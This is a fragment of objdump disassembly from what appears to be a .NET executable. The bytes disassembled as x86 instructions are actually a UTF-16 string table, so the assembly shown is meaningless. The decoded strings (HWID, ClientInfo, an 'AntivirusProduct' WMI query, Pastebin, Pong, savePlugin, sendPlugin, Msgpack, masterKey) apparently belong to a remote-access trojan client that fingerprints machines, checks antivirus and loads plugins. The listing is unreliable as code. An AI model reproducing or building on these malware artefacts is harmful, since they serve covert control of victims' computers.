  40c388:	00 57 00             	add    %dl,0x0(%edi)
  40c38b:	49                   	dec    %ecx
  40c38c:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c390:	05 78 00 32 00       	add    $0x320078,%eax
  40c395:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40c39b:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40c3a1:	74 00                	je     0x40c3a3
  40c3a3:	49                   	dec    %ecx
  40c3a4:	00 6e 00             	add    %ch,0x0(%esi)
  40c3a7:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c3ab:	00 09                	add    %cl,(%ecx)
  40c3ad:	48                   	dec    %eax
  40c3ae:	00 57 00             	add    %dl,0x0(%edi)
  40c3b1:	49                   	dec    %ecx
  40c3b2:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c3b6:	09 55 00             	or     %edx,0x0(%ebp)
  40c3b9:	73 00                	jae    0x40c3bb
  40c3bb:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c3bf:	00 05 4f 00 53 00    	add    %al,0x53004f
  40c3c5:	00 13                	add    %dl,(%ebx)
  40c3c7:	4d                   	dec    %ebp
  40c3c8:	00 69 00             	add    %ch,0x0(%ecx)
  40c3cb:	63 00                	arpl   %eax,(%eax)
  40c3cd:	72 00                	jb     0x40c3cf
  40c3cf:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3d0:	00 73 00             	add    %dh,0x0(%ebx)
  40c3d3:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3d4:	00 66 00             	add    %ah,0x0(%esi)
  40c3d7:	74 00                	je     0x40c3d9
  40c3d9:	00 03                	add    %al,(%ebx)
  40c3db:	20 00                	and    %al,(%eax)
  40c3dd:	00 09                	add    %cl,(%ecx)
  40c3df:	54                   	push   %esp
  40c3e0:	00 72 00             	add    %dh,0x0(%edx)
  40c3e3:	75 00                	jne    0x40c3e5
  40c3e5:	65 00 00             	add    %al,%gs:(%eax)
  40c3e8:	0b 36                	or     (%esi),%esi
  40c3ea:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c3ed:	62 00                	bound  %eax,(%eax)
  40c3ef:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40c3f5:	46                   	inc    %esi
  40c3f6:	00 61 00             	add    %ah,0x0(%ecx)
  40c3f9:	6c                   	insb   (%dx),%es:(%edi)
  40c3fa:	00 73 00             	add    %dh,0x0(%ebx)
  40c3fd:	65 00 00             	add    %al,%gs:(%eax)
  40c400:	0b 33                	or     (%ebx),%esi
  40c402:	00 32                	add    %dh,(%edx)
  40c404:	00 62 00             	add    %ah,0x0(%edx)
  40c407:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40c40d:	50                   	push   %eax
  40c40e:	00 61 00             	add    %ah,0x0(%ecx)
  40c411:	74 00                	je     0x40c413
  40c413:	68 00 00 0f 56       	push   $0x560f0000
  40c418:	00 65 00             	add    %ah,0x0(%ebp)
  40c41b:	72 00                	jb     0x40c41d
  40c41d:	73 00                	jae    0x40c41f
  40c41f:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c425:	00 0b                	add    %cl,(%ebx)
  40c427:	41                   	inc    %ecx
  40c428:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40c42c:	00 69 00             	add    %ch,0x0(%ecx)
  40c42f:	6e                   	outsb  %ds:(%esi),(%dx)
  40c430:	00 00                	add    %al,(%eax)
  40c432:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40c436:	00 75 00             	add    %dh,0x0(%ebp)
  40c439:	65 00 00             	add    %al,%gs:(%eax)
  40c43c:	0b 66 00             	or     0x0(%esi),%esp
  40c43f:	61                   	popa
  40c440:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40c444:	00 65 00             	add    %ah,0x0(%ebp)
  40c447:	00 17                	add    %dl,(%edi)
  40c449:	50                   	push   %eax
  40c44a:	00 65 00             	add    %ah,0x0(%ebp)
  40c44d:	72 00                	jb     0x40c44f
  40c44f:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c453:	72 00                	jb     0x40c455
  40c455:	6d                   	insl   (%dx),%es:(%edi)
  40c456:	00 61 00             	add    %ah,0x0(%ecx)
  40c459:	6e                   	outsb  %ds:(%esi),(%dx)
  40c45a:	00 63 00             	add    %ah,0x0(%ebx)
  40c45d:	65 00 00             	add    %al,%gs:(%eax)
  40c460:	11 50 00             	adc    %edx,0x0(%eax)
  40c463:	61                   	popa
  40c464:	00 73 00             	add    %dh,0x0(%ebx)
  40c467:	74 00                	je     0x40c469
  40c469:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40c46d:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40c473:	41                   	inc    %ecx
  40c474:	00 6e 00             	add    %ch,0x0(%esi)
  40c477:	74 00                	je     0x40c479
  40c479:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c47f:	72 00                	jb     0x40c481
  40c481:	75 00                	jne    0x40c483
  40c483:	73 00                	jae    0x40c485
  40c485:	00 13                	add    %dl,(%ebx)
  40c487:	49                   	dec    %ecx
  40c488:	00 6e 00             	add    %ch,0x0(%esi)
  40c48b:	73 00                	jae    0x40c48d
  40c48d:	74 00                	je     0x40c48f
  40c48f:	61                   	popa
  40c490:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c494:	00 65 00             	add    %ah,0x0(%ebp)
  40c497:	64 00 00             	add    %al,%fs:(%eax)
  40c49a:	09 50 00             	or     %edx,0x0(%eax)
  40c49d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c49e:	00 6e 00             	add    %ch,0x0(%esi)
  40c4a1:	67 00 00             	add    %al,(%bx,%si)
  40c4a4:	0b 47 00             	or     0x0(%edi),%eax
  40c4a7:	72 00                	jb     0x40c4a9
  40c4a9:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4aa:	00 75 00             	add    %dh,0x0(%ebp)
  40c4ad:	70 00                	jo     0x40c4af
  40c4af:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40c4b5:	00 2b                	add    %ch,(%ebx)
  40c4b7:	5c                   	pop    %esp
  40c4b8:	00 72 00             	add    %dh,0x0(%edx)
  40c4bb:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4bc:	00 6f 00             	add    %ch,0x0(%edi)
  40c4bf:	74 00                	je     0x40c4c1
  40c4c1:	5c                   	pop    %esp
  40c4c2:	00 53 00             	add    %dl,0x0(%ebx)
  40c4c5:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c4c9:	75 00                	jne    0x40c4cb
  40c4cb:	72 00                	jb     0x40c4cd
  40c4cd:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40c4d3:	43                   	inc    %ebx
  40c4d4:	00 65 00             	add    %ah,0x0(%ebp)
  40c4d7:	6e                   	outsb  %ds:(%esi),(%dx)
  40c4d8:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c4dc:	00 72 00             	add    %dh,0x0(%edx)
  40c4df:	32 00                	xor    (%eax),%al
  40c4e1:	00 3d 53 00 65 00    	add    %bh,0x650053
  40c4e7:	6c                   	insb   (%dx),%es:(%edi)
  40c4e8:	00 65 00             	add    %ah,0x0(%ebp)
  40c4eb:	63 00                	arpl   %eax,(%eax)
  40c4ed:	74 00                	je     0x40c4ef
  40c4ef:	20 00                	and    %al,(%eax)
  40c4f1:	2a 00                	sub    (%eax),%al
  40c4f3:	20 00                	and    %al,(%eax)
  40c4f5:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c4f9:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4fa:	00 6d 00             	add    %ch,0x0(%ebp)
  40c4fd:	20 00                	and    %al,(%eax)
  40c4ff:	41                   	inc    %ecx
  40c500:	00 6e 00             	add    %ch,0x0(%esi)
  40c503:	74 00                	je     0x40c505
  40c505:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c50b:	72 00                	jb     0x40c50d
  40c50d:	75 00                	jne    0x40c50f
  40c50f:	73 00                	jae    0x40c511
  40c511:	50                   	push   %eax
  40c512:	00 72 00             	add    %dh,0x0(%edx)
  40c515:	6f                   	outsl  %ds:(%esi),(%dx)
  40c516:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40c51a:	00 63 00             	add    %ah,0x0(%ebx)
  40c51d:	74 00                	je     0x40c51f
  40c51f:	00 17                	add    %dl,(%edi)
  40c521:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40c525:	73 00                	jae    0x40c527
  40c527:	70 00                	jo     0x40c529
  40c529:	6c                   	insb   (%dx),%es:(%edi)
  40c52a:	00 61 00             	add    %ah,0x0(%ecx)
  40c52d:	79 00                	jns    0x40c52f
  40c52f:	4e                   	dec    %esi
  40c530:	00 61 00             	add    %ah,0x0(%ecx)
  40c533:	6d                   	insl   (%dx),%es:(%edi)
  40c534:	00 65 00             	add    %ah,0x0(%ebp)
  40c537:	00 07                	add    %al,(%edi)
  40c539:	4e                   	dec    %esi
  40c53a:	00 2f                	add    %ch,(%edi)
  40c53c:	00 41 00             	add    %al,0x0(%ecx)
  40c53f:	00 05 2c 00 20 00    	add    %al,0x20002c
  40c545:	00 13                	add    %dl,(%ebx)
  40c547:	53                   	push   %ebx
  40c548:	00 6f 00             	add    %ch,0x0(%edi)
  40c54b:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40c550:	00 61 00             	add    %ah,0x0(%ecx)
  40c553:	72 00                	jb     0x40c555
  40c555:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40c55a:	09 70 00             	or     %esi,0x0(%eax)
  40c55d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c55e:	00 6e 00             	add    %ch,0x0(%esi)
  40c561:	67 00 00             	add    %al,(%bx,%si)
  40c564:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40c569:	75 00                	jne    0x40c56b
  40c56b:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c56f:	6e                   	outsb  %ds:(%esi),(%dx)
  40c570:	00 00                	add    %al,(%eax)
  40c572:	15 73 00 61 00       	adc    $0x610073,%eax
  40c577:	76 00                	jbe    0x40c579
  40c579:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40c57d:	6c                   	insb   (%dx),%es:(%edi)
  40c57e:	00 75 00             	add    %dh,0x0(%ebp)
  40c581:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c585:	6e                   	outsb  %ds:(%esi),(%dx)
  40c586:	00 00                	add    %al,(%eax)
  40c588:	07                   	pop    %es
  40c589:	44                   	inc    %esp
  40c58a:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c58e:	00 00                	add    %al,(%eax)
  40c590:	15 73 00 65 00       	adc    $0x650073,%eax
  40c595:	6e                   	outsb  %ds:(%esi),(%dx)
  40c596:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40c59a:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c59e:	00 67 00             	add    %ah,0x0(%edi)
  40c5a1:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40c5a7:	48                   	dec    %eax
  40c5a8:	00 61 00             	add    %ah,0x0(%ecx)
  40c5ab:	73 00                	jae    0x40c5ad
  40c5ad:	68 00 65 00 73       	push   $0x73006500
  40c5b2:	00 00                	add    %al,(%eax)
  40c5b4:	09 48 00             	or     %ecx,0x0(%eax)
  40c5b7:	61                   	popa
  40c5b8:	00 73 00             	add    %dh,0x0(%ebx)
  40c5bb:	68 00 00 1b 50       	push   $0x501b0000
  40c5c0:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c5c4:	00 67 00             	add    %ah,0x0(%edi)
  40c5c7:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40c5cd:	50                   	push   %eax
  40c5ce:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c5d2:	00 67 00             	add    %ah,0x0(%edi)
  40c5d5:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40c5db:	52                   	push   %edx
  40c5dc:	00 75 00             	add    %dh,0x0(%ebp)
  40c5df:	6e                   	outsb  %ds:(%esi),(%dx)
  40c5e0:	00 00                	add    %al,(%eax)
  40c5e2:	0f 4d 00             	cmovge (%eax),%eax
  40c5e5:	73 00                	jae    0x40c5e7
  40c5e7:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40c5eb:	61                   	popa
  40c5ec:	00 63 00             	add    %ah,0x0(%ebx)
  40c5ef:	6b 00 00             	imul   $0x0,(%eax),%eax
  40c5f2:	11 52 00             	adc    %edx,0x0(%edx)
  40c5f5:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c5f9:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40c5fd:	76 00                	jbe    0x40c5ff
  40c5ff:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40c604:	0b 45 00             	or     0x0(%ebp),%eax
  40c607:	72 00                	jb     0x40c609
  40c609:	72 00                	jb     0x40c60b
  40c60b:	6f                   	outsl  %ds:(%esi),(%dx)
  40c60c:	00 72 00             	add    %dh,0x0(%edx)
  40c60f:	00 47 6d             	add    %al,0x6d(%edi)
  40c612:	00 61 00             	add    %ah,0x0(%ecx)
  40c615:	73 00                	jae    0x40c617
  40c617:	74 00                	je     0x40c619
  40c619:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c61d:	4b                   	dec    %ebx
  40c61e:	00 65 00             	add    %ah,0x0(%ebp)
  40c621:	79 00                	jns    0x40c623
  40c623:	20 00                	and    %al,(%eax)
  40c625:	63 00                	arpl   %eax,(%eax)
  40c627:	61                   	popa
  40c628:	00 6e 00             	add    %ch,0x0(%esi)
  40c62b:	20 00                	and    %al,(%eax)
  40c62d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c62e:	00 6f 00             	add    %ch,0x0(%edi)
  40c631:	74 00                	je     0x40c633
  40c633:	20 00                	and    %al,(%eax)
  40c635:	62 00                	bound  %eax,(%eax)
  40c637:	65 00 20             	add    %ah,%gs:(%eax)
  40c63a:	00 6e 00             	add    %ch,0x0(%esi)
  40c63d:	75 00                	jne    0x40c63f
  40c63f:	6c                   	insb   (%dx),%es:(%edi)
  40c640:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40c644:	00 6f 00             	add    %ch,0x0(%edi)
  40c647:	72 00                	jb     0x40c649
  40c649:	20 00                	and    %al,(%eax)
  40c64b:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c64f:	70 00                	jo     0x40c651
  40c651:	74 00                	je     0x40c653
  40c653:	79 00                	jns    0x40c655
  40c655:	2e 00 00             	add    %al,%cs:(%eax)
  40c658:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40c65d:	70 00                	jo     0x40c65f
  40c65f:	75 00                	jne    0x40c661
  40c661:	74 00                	je     0x40c663
  40c663:	20 00                	and    %al,(%eax)
  40c665:	63 00                	arpl   %eax,(%eax)
  40c667:	61                   	popa
  40c668:	00 6e 00             	add    %ch,0x0(%esi)
  40c66b:	20 00                	and    %al,(%eax)
  40c66d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c66e:	00 6f 00             	add    %ch,0x0(%edi)
  40c671:	74 00                	je     0x40c673
  40c673:	20 00                	and    %al,(%eax)
  40c675:	62 00                	bound  %eax,(%eax)
  40c677:	65 00 20             	add    %ah,%gs:(%eax)
  40c67a:	00 6e 00             	add    %ch,0x0(%esi)
  40c67d:	75 00                	jne    0x40c67f
  40c67f:	6c                   	insb   (%dx),%es:(%edi)
  40c680:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c684:	00 00                	add    %al,(%eax)
  40c686:	55                   	push   %ebp
  40c687:	49                   	dec    %ecx
  40c688:	00 6e 00             	add    %ch,0x0(%esi)
  40c68b:	76 00                	jbe    0x40c68d
  40c68d:	61                   	popa
  40c68e:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40c692:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40c696:	00 6d 00             	add    %ch,0x0(%ebp)
  40c699:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c69d:	73 00                	jae    0x40c69f
  40c69f:	61                   	popa
  40c6a0:	00 67 00             	add    %ah,0x0(%edi)
  40c6a3:	65 00 20             	add    %ah,%gs:(%eax)
  40c6a6:	00 61 00             	add    %ah,0x0(%ecx)
  40c6a9:	75 00                	jne    0x40c6ab
  40c6ab:	74 00                	je     0x40c6ad
  40c6ad:	68 00 65 00 6e       	push   $0x6e006500
  40c6b2:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c6b6:	00 63 00             	add    %ah,0x0(%ebx)
  40c6b9:	61                   	popa
  40c6ba:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c6be:	00 6f 00             	add    %ch,0x0(%edi)
  40c6c1:	6e                   	outsb  %ds:(%esi),(%dx)
  40c6c2:	00 20                	add    %ah,(%eax)
  40c6c4:	00 63 00             	add    %ah,0x0(%ebx)
  40c6c7:	6f                   	outsl  %ds:(%esi),(%dx)
  40c6c8:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c6cc:	00 20                	add    %ah,(%eax)
  40c6ce:	00 28                	add    %ch,(%eax)
  40c6d0:	00 4d 00             	add    %cl,0x0(%ebp)
  40c6d3:	41                   	inc    %ecx
  40c6d4:	00 43 00             	add    %al,0x0(%ebx)
  40c6d7:	29 00                	sub    %eax,(%eax)
  40c6d9:	2e 00 00             	add    %al,%cs:(%eax)
  40c6dc:	05 58 00 32 00       	add    $0x320058,%eax
  40c6e1:	00 0f                	add    %cl,(%edi)
  40c6e3:	7b 00                	jnp    0x40c6e5
  40c6e5:	30 00                	xor    %al,(%eax)
  40c6e7:	3a 00                	cmp    (%eax),%al
  40c6e9:	44                   	inc    %esp
  40c6ea:	00 33                	add    %dh,(%ebx)
  40c6ec:	00 7d 00             	add    %bh,0x0(%ebp)
  40c6ef:	20 00                	and    %al,(%eax)
  40c6f1:	00 0f                	add    %cl,(%edi)
  40c6f3:	7b 00                	jnp    0x40c6f5
  40c6f5:	30 00                	xor    %al,(%eax)
  40c6f7:	3a 00                	cmp    (%eax),%al
  40c6f9:	58                   	pop    %eax
  40c6fa:	00 32                	add    %dh,(%edx)
  40c6fc:	00 7d 00             	add    %bh,0x0(%ebp)
  40c6ff:	20 00                	and    %al,(%eax)
  40c701:	00 2b                	add    %ch,(%ebx)
  40c703:	28 00                	sub    %al,(%eax)
  40c705:	6e                   	outsb  %ds:(%esi),(%dx)
  40c706:	00 65 00             	add    %ah,0x0(%ebp)
  40c709:	76 00                	jbe    0x40c70b
  40c70b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c70f:	20 00                	and    %al,(%eax)
  40c711:	75 00                	jne    0x40c713
  40c713:	73 00                	jae    0x40c715
  40c715:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40c71a:	00 20                	add    %ah,(%eax)
  40c71c:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40c720:	00 70 00             	add    %dh,0x0(%eax)
  40c723:	65 00 20             	add    %ah,%gs:(%eax)
  40c726:	00 24 00             	add    %ah,(%eax,%eax,1)
  40c729:	63 00                	arpl   %eax,(%eax)
  40c72b:	31 00                	xor    %eax,(%eax)
  40c72d:	00 45 28             	add    %al,0x28(%ebp)
  40c730:	00 65 00             	add    %ah,0x0(%ebp)
  40c733:	78 00                	js     0x40c735
  40c735:	74 00                	je     0x40c737
  40c737:	38 00                	cmp    %al,(%eax)
  40c739:	2c 00                	sub    $0x0,%al
  40c73b:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40c73f:	74 00                	je     0x40c741
  40c741:	31 00                	xor    %eax,(%eax)
  40c743:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40c747:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40c74b:	33 00                	xor    (%eax),%eax
  40c74d:	32 00                	xor    (%eax),%al
  40c74f:	29 00                	sub    %eax,(%eax)
  40c751:	20 00                	and    %al,(%eax)
  40c753:	74 00                	je     0x40c755
  40c755:	79 00                	jns    0x40c757
  40c757:	70 00                	jo     0x40c759
  40c759:	65 00 20             	add    %ah,%gs:(%eax)
  40c75c:	00 24 00             	add    %ah,(%eax,%eax,1)
  40c75f:	63 00                	arpl   %eax,(%eax)
  40c761:	37                   	aaa
  40c762:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40c765:	24 00                	and    $0x0,%al
  40c767:	63 00                	arpl   %eax,(%eax)
  40c769:	38 00                	cmp    %al,(%eax)
  40c76b:	2c 00                	sub    $0x0,%al
  40c76d:	24 00                	and    $0x0,%al
  40c76f:	63 00                	arpl   %eax,(%eax)
  40c771:	39 00                	cmp    %eax,(%eax)
  40c773:	00 14 74             	add    %dl,(%esp,%esi,2)
  40c776:	6b 73 7b 88          	imul   $0xffffff88,0x7b(%ebx),%esi
  40c77a:	11 4e 8d             	adc    %ecx,-0x73(%esi)
  40c77d:	24 f5                	and    $0xf5,%al
  40c77f:	ac                   	lods   %ds:(%esi),%al
  40c780:	9a d7 a1 0a 00 08 b7 	lcall  $0xb708,$0xaa1d7
  40c787:	7a 5c                	jp     0x40c7e5
  40c789:	56                   	push   %esi
  40c78a:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40c78d:	89 03                	mov    %eax,(%ebx)
  40c78f:	00 00                	add    %al,(%eax)
  40c791:	01 03                	add    %eax,(%ebx)
  40c793:	20 00                	and    %al,(%eax)
  40c795:	01 02                	add    %eax,(%edx)
  40c797:	06                   	push   %es
  40c798:	0e                   	push   %cs
  40c799:	03 06                	add    (%esi),%eax
  40c79b:	12 09                	adc    (%ecx),%cl
  40c79d:	03 06                	add    (%esi),%eax
  40c79f:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40c7a3:	00 02                	add    %al,(%edx)
  40c7a5:	03 06                	add    (%esi),%eax
  40c7a7:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40c7ad:	03 06                	add    (%esi),%eax
  40c7af:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40c7b4:	03 06                	add    (%esi),%eax
  40c7b6:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40c7bc:	06                   	push   %es
  40c7bd:	1c 02                	sbb    $0x2,%al
  40c7bf:	06                   	push   %es
  40c7c0:	08 04 00             	or     %al,(%eax,%eax,1)
  40c7c3:	00 12                	add    %dl,(%edx)
  40c7c5:	0d 05 00 01 01       	or     $0x1010005,%eax
  40c7ca:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40c7d0:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40c7d6:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40c7d9:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40c7df:	01 1d 05 03 00 00    	add    %ebx,0x305
  40c7e5:	0a 04 00             	or     (%eax,%eax,1),%al
  40c7e8:	01 01                	add    %eax,(%ecx)
  40c7ea:	0a 04 00             	or     (%eax,%eax,1),%al
  40c7ed:	00 12                	add    %dl,(%edx)
  40c7ef:	15 05 00 01 01       	adc    $0x1010005,%eax
  40c7f4:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40c7fa:	02 03                	add    (%ebx),%al
  40c7fc:	00 00                	add    %al,(%eax)
  40c7fe:	1c 03                	sbb    $0x3,%al
  40c800:	00 00                	add    %al,(%eax)
  40c802:	08 04 00             	or     %al,(%eax,%eax,1)
  40c805:	01 01                	add    %eax,(%ecx)
  40c807:	08 04 00             	or     %al,(%eax,%eax,1)
  40c80a:	01 02                	add    %eax,(%edx)
  40c80c:	0e                   	push   %cs
  40c80d:	0a 00                	or     (%eax),%al
  40c80f:	04 02                	add    $0x2,%al
  40c811:	1c 12                	sbb    $0x12,%al
  40c813:	19 12                	sbb    %edx,(%edx)
  40c815:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40c81a:	01 01                	add    %eax,(%ecx)
  40c81c:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40c822:	1c 04                	sbb    $0x4,%al
  40c824:	08 00                	or     %al,(%eax)
  40c826:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40c82c:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40c82f:	00 1d 05 03 08 00    	add    %bl,0x80305
  40c835:	0a 04 08             	or     (%eax,%ecx,1),%al
  40c838:	00 12                	add    %dl,(%edx)
  40c83a:	15 03 08 00 02       	adc    $0x2000803,%eax
  40c83f:	03 08                	add    (%eax),%ecx
  40c841:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c844:	08 00                	or     %al,(%eax)
  40c846:	08 03                	or     %al,(%ebx)
  40c848:	00 00                	add    %al,(%eax)
  40c84a:	0e                   	push   %cs
  40c84b:	04 00                	add    $0x0,%al
  40c84d:	01 0e                	add    %ecx,(%esi)
  40c84f:	0e                   	push   %cs
  40c850:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40c856:	d5 0a                	aad    $0xa
  40c858:	3a 06                	cmp    (%esi),%al
  40c85a:	00 01                	add    %al,(%ecx)
  40c85c:	12 29                	adc    (%ecx),%ch
  40c85e:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40c864:	03 00                	add    (%eax),%eax
  40c866:	00 18                	add    %bl,(%eax)
  40c868:	07                   	pop    %es
  40c869:	00 03                	add    %al,(%ebx)
  40c86b:	08 18                	or     %bl,(%eax)
  40c86d:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40c873:	18 0e                	sbb    %cl,(%esi)
  40c875:	06                   	push   %es
  40c876:	00 02                	add    %al,(%edx)
  40c878:	02 18                	add    (%eax),%bl
  40c87a:	10 02                	adc    %al,(%edx)
  40c87c:	06                   	push   %es
  40c87d:	00 01                	add    %al,(%ecx)
  40c87f:	11 30                	adc    %esi,(%eax)
  40c881:	11 30                	adc    %esi,(%eax)
  40c883:	06                   	push   %es
  40c884:	00 03                	add    %al,(%ebx)
  40c886:	01 09                	add    %ecx,(%ecx)
  40c888:	09 09                	or     %ecx,(%ecx)
  40c88a:	02 06                	add    (%esi),%al
  40c88c:	09 03                	or     %eax,(%ebx)
  40c88e:	06                   	push   %es
  40c88f:	11 30                	adc    %esi,(%eax)
  40c891:	04 00                	add    $0x0,%al
  40c893:	00 00                	add    %al,(%eax)
  40c895:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40c899:	00 00                	add    %al,(%eax)
  40c89b:	04 01                	add    $0x1,%al
  40c89d:	00 00                	add    %al,(%eax)
  40c89f:	00 06                	add    %al,(%esi)
  40c8a1:	00 02                	add    %al,(%edx)
  40c8a3:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c8a6:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40c8ab:	0e                   	push   %cs
  40c8ac:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c8b1:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40c8b6:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c8bb:	60                   	pusha
  40c8bc:	05 00 01 01 12       	add    $0x12010100,%eax
  40c8c1:	60                   	pusha
  40c8c2:	04 00                	add    $0x0,%al
  40c8c4:	01 01                	add    %eax,(%ecx)
  40c8c6:	0e                   	push   %cs
  40c8c7:	18 06                	sbb    %al,(%esi)
  40c8c9:	15 12 45 01 15       	adc    $0x15014512,%eax
  40c8ce:	12 49 0a             	adc    0xa(%ecx),%cl
  40c8d1:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40c8d4:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40c8da:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c8df:	0e                   	push   %cs
  40c8e0:	04 20                	add    $0x20,%al
  40c8e2:	00 00                	add    %al,(%eax)
  40c8e4:	00 04 40             	add    %al,(%eax,%eax,2)
  40c8e7:	00 00                	add    %al,(%eax)
  40c8e9:	00 04 10             	add    %al,(%eax,%edx,1)
  40c8ec:	00 00                	add    %al,(%eax)
  40c8ee:	00 04 20             	add    %al,(%eax,%eiz,1)
  40c8f1:	01 01                	add    %eax,(%ecx)
  40c8f3:	0e                   	push   %cs
  40c8f4:	04 20                	add    $0x20,%al
  40c8f6:	01 0e                	add    %ecx,(%esi)
  40c8f8:	0e                   	push   %cs
  40c8f9:	06                   	push   %es
  40c8fa:	20 01                	and    %al,(%ecx)
  40c8fc:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40c901:	20 02                	and    %al,(%edx)
  40c903:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40c909:	00 01                	add    %al,(%ecx)
  40c90b:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40c910:	06                   	push   %es
  40c911:	11 50 03             	adc    %edx,0x3(%eax)
  40c914:	06                   	push   %es
  40c915:	12 55 05             	adc    0x5(%ebp),%dl
  40c918:	00 01                	add    %al,(%ecx)
  40c91a:	0e                   	push   %cs
  40c91b:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c920:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40c925:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40c92b:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40c931:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40c937:	01 01                	add    %eax,(%ecx)
  40c939:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c93e:	60                   	pusha
